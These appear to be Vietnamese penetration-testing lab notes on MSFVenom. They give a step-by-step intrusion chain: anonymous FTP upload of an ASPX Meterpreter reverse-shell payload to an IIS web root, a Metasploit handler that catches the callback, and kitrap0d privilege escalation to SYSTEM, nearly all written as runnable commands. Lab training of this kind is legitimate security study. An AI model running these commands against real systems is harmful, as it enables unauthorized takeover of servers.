# Introduction to MSFVenom

## Tổng quan

MSFVenom là công cụ hợp nhất của:

- `MSFPayload`: tạo payload/shellcode.
    
- `MSFEncode`: encode payload và xử lý bad characters.
    

MSFVenom có thể tạo payload theo:

```text
OS + Architecture + Payload type + Connection type + Output format
```

Encoding không bảo đảm bypass antivirus hiện đại. Encoder chủ yếu hữu ích khi cần loại bỏ bad characters hoặc đáp ứng giới hạn của exploit.

## Attack path trong lab

```text
FTP anonymous có quyền upload
        ↓
FTP root được map tới IIS web root
        ↓
IIS cho phép thực thi ASPX
        ↓
Upload ASPX Meterpreter payload
        ↓
Kích hoạt file qua HTTP
        ↓
Nhận Meterpreter với quyền IIS APPPOOL
        ↓
Local privilege escalation
        ↓
NT AUTHORITY\SYSTEM
```

## Enumeration

```bash
nmap -sV -T4 -p- 10.10.10.5
```

Kết quả quan trọng:

```text
21/tcp → Microsoft FTP
80/tcp → Microsoft IIS
```

## FTP anonymous

```bash
ftp 10.10.10.5
```

Đăng nhập:

```text
Username: anonymous
Password: bất kỳ
```

Liệt kê file:

```text
ftp> ls
```

Kiểm tra FTP có quyền upload hay không và file có được phục vụ qua HTTP hay không.

## Tạo ASPX Meterpreter payload

```bash
msfvenom \
-p windows/meterpreter/reverse_tcp \
LHOST=<TUN0_IP> \
LPORT=1337 \
-f aspx \
> reverse_shell.aspx
```

Giải thích:

- `-p`: chọn payload.
    
- `windows/meterpreter/reverse_tcp`: staged Meterpreter reverse TCP cho Windows.
    
- `LHOST`: IP attack box mà target kết nối về.
    
- `LPORT`: port listener.
    
- `-f aspx`: tạo output ASPX.
    
- `>`: ghi output vào file.
    

## Upload payload

```text
ftp> put reverse_shell.aspx
```

## Handler

```text
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <TUN0_IP>
set LPORT 1337
run
```

Payload, LHOST và LPORT của handler phải khớp với MSFVenom.

## Trigger

```text
http://<TARGET_IP>/reverse_shell.aspx
```

Trang trắng không có nghĩa payload không chạy. Kiểm tra listener để xác nhận session.

## Kiểm tra session

```text
meterpreter > getuid
meterpreter > sysinfo
```

Ví dụ:

```text
IIS APPPOOL\Web
```

Payload chạy với quyền của IIS worker process, không mặc định có quyền Administrator.

## Staged và stageless

Staged:

```text
windows/meterpreter/reverse_tcp
```

```text
Stage nhỏ → callback → tải Meterpreter stage
```

Stageless:

```text
windows/meterpreter_reverse_tcp
```

```text
Toàn bộ Meterpreter nằm trong payload ban đầu
```

## Local Exploit Suggester

```text
use post/multi/recon/local_exploit_suggester
set SESSION <SESSION_ID>
set SHOWDESCRIPTION true
run
```

Kết quả chỉ là gợi ý, không bảo đảm exploit thành công.

Cần kiểm tra:

- OS version/build.
    
- Architecture.
    
- Patch level.
    
- Current privilege.
    
- Session architecture.
    
- Điều kiện riêng của exploit.
    

## Local privilege escalation

```text
search kitrap0d
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <SESSION_ID>
set LHOST <TUN0_IP>
set LPORT 1338
run
```

Xác minh:

```text
meterpreter > getuid
```

Kết quả thành công:

```text
NT AUTHORITY\SYSTEM
```

## Ghi nhớ

- `aspnet_client` chỉ là dấu hiệu ASP.NET, không chứng minh upload directory thực thi được ASPX.
    
- FTP upload phải được map tới web-accessible directory.
    
- Handler phải dùng đúng payload, LHOST và LPORT.
    
- UAC bypass thường cần user đã thuộc nhóm Administrators.
    
- Local Exploit Suggester có thể tạo false positive.
    
- Encoding không phải giải pháp đáng tin cậy để bypass AV.
    
- Session chết có thể do sai architecture, worker process bị recycle, network lỗi hoặc payload/handler không khớp.